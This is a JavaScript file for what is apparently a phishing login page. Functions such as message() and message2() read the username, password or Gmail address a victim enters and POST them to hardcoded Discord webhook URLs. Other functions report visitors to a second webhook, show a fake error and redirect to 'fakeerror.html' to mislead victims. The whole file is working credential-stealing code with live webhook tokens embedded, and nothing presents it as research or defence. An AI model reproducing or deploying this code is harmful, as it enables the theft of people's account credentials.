
function message() {
  let username = document.getElementById("username").value;
  let password = document.getElementById("password").value;
  
  const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
  const contents = `New Account Found\nUsername: ${username}\nPassword: ${password}\n `
  const request = new XMLHttpRequest();
  request.open("POST", WebHook);
  request.setRequestHeader('Content-type', 'application/json');
  const params = {
    content: contents
  }
  request.send(JSON.stringify(params));
}

function message2() {
  let username = document.getElementById("gmail").value;
  const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
  const contents = `New Email Found\nGmail: ${username}\n`
  const request = new XMLHttpRequest();
  request.open("POST", WebHook);
  request.setRequestHeader('Content-type', 'application/json');
  const params = {
    content: contents
  }
  request.send(JSON.stringify(params));
}

function welcome() {
  let user = document.getElementById("username").value;
  let pass = document.getElementById("password").value;
  
  const WebHoook = "https://discord.com/api/webhooks/1179708977852977233/bvLicIL96CrCxPGjDIVdOqA2uRGasWNt8-J3wyvhOPelRf3_t5Nwqo-6bK3gkeF6SO1I"
  const conteents = `Random user in login menu\nThe USER is in login menu`
  const requeest = new XMLHttpRequest();
  requeest.open("POST", WebHoook);
  requeest.setRequestHeader('Content-type', 'application/json');
  const paraams = {
    content: conteents
  }
  requeest.send(JSON.stringify(paraams));
}



function welcome2() {
  let user = document.getElementById("username").value;
  let pass = document.getElementById("password").value;
  
  const WebHoooook = "https://discord.com/api/webhooks/1179708977852977233/bvLicIL96CrCxPGjDIVdOqA2uRGasWNt8-J3wyvhOPelRf3_t5Nwqo-6bK3gkeF6SO1I"
  const conteeeents = `Random user in AutoLogin menu\nThe USER is in AutoLogin menu`
  const requeeeest = new XMLHttpRequest();
  requeeeest.open("POST", WebHoooook);
  requeeeest.setRequestHeader('Content-type', 'application/json');
  const paraaaams = {
    content: conteeeents
  }
  requeeeest.send(JSON.stringify(paraaaams));
}

  function toggleOverlay() {
    var overlay = document.getElementById('overlay');
    overlay.style.display = 'flex';

    setTimeout(function() {
      overlay.style.display = 'none';
    }, 5000); // 2000 milliseconds = 2 seconds
  }
  
  function showFakeError() {
  // Show error after 5 seconds
  setTimeout(() => {
    const errorContainer = document.querySelector('.hidden');
    errorContainer.style.display = 'block';
  }, 5000);
}


function validateLogin() {
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;
  var errorContainer = document.querySelector('.hidden');

  if (username.trim() === '' || password.trim() === '') {
    // Either username or password is empty
    errorContainer.style.display = 'block';
  } else {
    // Both username and password are filled, attempt login
    // Add your login logic here, for now, let's just show an alert
       setTimeout(function () {
                window.location.href = 'whatgames.html';
            }, 7000); // 7000 milliseconds = 7 seconds
  }
}

function validateLogin2() {
  var username = document.getElementById('gmail').value;
  var errorContainer = document.querySelector('.hidden');

  if (username.trim() === '') {
    // Either username or password is empty
    errorContainer.style.display = 'block';
  } else {
    // Both username and password are filled, attempt login
    // Add your login logic here, for now, let's just show an alert
            setTimeout(function () {
                window.location.href = 'fakeerror.html';
            }, 7000); // 7000 milliseconds = 7 seconds
  }
}